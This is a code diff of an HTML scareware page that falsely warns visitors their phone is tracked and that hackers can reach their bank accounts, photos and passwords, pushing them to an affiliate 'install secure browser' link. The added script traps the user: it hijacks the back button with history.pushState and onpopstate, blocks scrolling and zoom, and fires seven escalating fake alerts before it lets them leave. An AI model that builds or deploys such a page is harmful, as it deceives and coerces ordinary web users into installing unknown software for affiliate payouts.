@@ -1,91 +1,214 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Alert - Protect Your Device</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Alert</title>
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: #111;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #000;
             color: white;
-            text-align: center;
             height: 100vh;
+            overflow: hidden;
+            touch-action: manipulation;
+            position: fixed;
+            width: 100%;
+        }
+        
+        .alert-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
             display: flex;
             justify-content: center;
             align-items: center;
-            background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
-            background-size: cover;
+            z-index: 1000;
+            padding: 20px;
         }
-        .warning-box {
-            background: rgba(200, 0, 0, 0.9);
-            border: 3px solid red;
-            border-radius: 10px;
+        
+        .alert-box {
+            background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
+            border: 3px solid #ff0000;
+            border-radius: 15px;
             padding: 25px;
-            max-width: 500px;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
             animation: pulse 1.5s infinite;
         }
+        
         @keyframes pulse {
-            0% { box-shadow: 0 0 10px red; }
-            50% { box-shadow: 0 0 30px red; }
-            100% { box-shadow: 0 0 10px red; }
+            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); }
+            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
         }
+        
+        .alert-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #fff;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        
+        p {
+            margin-bottom: 20px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
         .btn {
-            padding: 12px 25px;
-            margin: 10px;
+            padding: 14px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             font-weight: bold;
+            font-size: 16px;
             cursor: pointer;
+            transition: all 0.2s;
         }
-        .btn-protect {
-            background: #00aa00;
+        
+        .btn-install {
+            background: linear-gradient(to right, #00c853, #00e676);
             color: white;
+            box-shadow: 0 4px 0 #009624;
         }
-        .btn-ignore {
+        
+        .btn-install:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #009624;
+        }
+        
+        .btn-cancel {
             background: #333;
-            color: white;
+            color: #ccc;
+        }
+        
+        .btn-cancel:active {
+            background: #444;
+        }
+        
+        .exit-attempts {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #ff9999;
+        }
+        
+        /* Disable zooming and text selection */
+        body {
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: pan-y;
         }
     </style>
 </head>
 <body>
-    <div class="warning-box">
-        <h1>⚠️ CRITICAL SECURITY ALERT ⚠️</h1>
-        <p><strong>YOUR LOCATION HAS BEEN LEAKED!</strong></p>
-        <p>Hackers can access your bank accounts if you don't secure your device NOW.</p>
-        <button class="btn btn-protect" onclick="window.location.href='YOUR_CPA_LINK'">
-            🔒 INSTALL SECURE BROWSER NOW
-        </button>
-        <button class="btn btn-ignore" id="ignoreBtn">
-            IGNORE (UNSAFE)
-        </button>
+    <div class="alert-container" id="alertContainer">
+        <div class="alert-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
+            <h1>⚠️ EMERGENCY SECURITY ALERT ⚠️</h1>
+            <p><strong>YOUR PHONE IS BEING TRACKED!</strong></p>
+            <p>Hackers have changed your virtual location and can access:</p>
+            <p>• Bank accounts<br>• Photos<br>• Passwords</p>
+            <div class="btn-group">
+                <button class="btn btn-install" onclick="window.location.href='YOUR_CPA_LINK'">
+                    🔒 INSTALL SECURE BROWSER NOW
+                </button>
+                <button class="btn btn-cancel" id="cancelBtn">
+                    IGNORE WARNING (RISKY)
+                </button>
+            </div>
+            <div class="exit-attempts" id="exitAttempts">
+                Warning: 0/7 attempts to exit
+            </div>
+        </div>
     </div>
 
     <script>
-        let backCount = 0;
-        const maxBackClicks = 7;
-        const ignoreBtn = document.getElementById('ignoreBtn');
+        let attempts = 0;
+        const maxAttempts = 7;
+        const cancelBtn = document.getElementById('cancelBtn');
+        const exitAttemptsText = document.getElementById('exitAttempts');
         
-        // Warn user when trying to leave
-        window.onbeforeunload = function(e) {
-            backCount++;
-            if (backCount < maxBackClicks) {
-                e.preventDefault();
-                e.returnValue = `⚠️ WARNING (${backCount}/${maxBackClicks}): Leaving may expose you to hackers!`;
-                return e.returnValue;
-            }
+        // Disable back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function(event) {
+            history.go(1);
+            handleExitAttempt();
         };
-
-        // "Ignore" button also triggers warning
-        ignoreBtn.addEventListener('click', function() {
-            backCount++;
-            if (backCount < maxBackClicks) {
-                alert(`⚠️ WARNING (${backCount}/${maxBackClicks}): You are at risk!`);
+        
+        // Handle exit attempts
+        function handleExitAttempt() {
+            attempts++;
+            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
+            
+            if (attempts < maxAttempts) {
+                // Show increasingly urgent warnings
+                const warnings = [
+                    "Your data is still at risk!",
+                    "Hackers may be accessing your photos!",
+                    "Bank accounts vulnerable!",
+                    "Last chance to protect yourself!",
+                    "Security breach detected!",
+                    "Critical danger!",
+                    "Final warning!"
+                ];
+                
+                alert(`⚠️ ${warnings[attempts-1]}`);
+                
+                // Make the alert box shake
+                const alertBox = document.querySelector('.alert-box');
+                alertBox.style.animation = 'none';
+                alertBox.offsetHeight; // Trigger reflow
+                alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
+                
+                // Add shake animation
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes shake {
+                        0%, 100% { transform: translateX(0); }
+                        20% { transform: translateX(-10px); }
+                        40% { transform: translateX(10px); }
+                        60% { transform: translateX(-10px); }
+                        80% { transform: translateX(10px); }
+                    }
+                `;
+                document.head.appendChild(style);
             } else {
-                window.location.href = "about:blank"; // Redirects away after 7 clicks
+                // After 7 attempts, allow exit
+                window.location.href = "about:blank";
             }
-        });
+        }
+        
+        // Cancel button also counts as attempt
+        cancelBtn.addEventListener('click', handleExitAttempt);
+        
+        // Prevent touch scrolling
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
     </script>
 </body>
 </html>
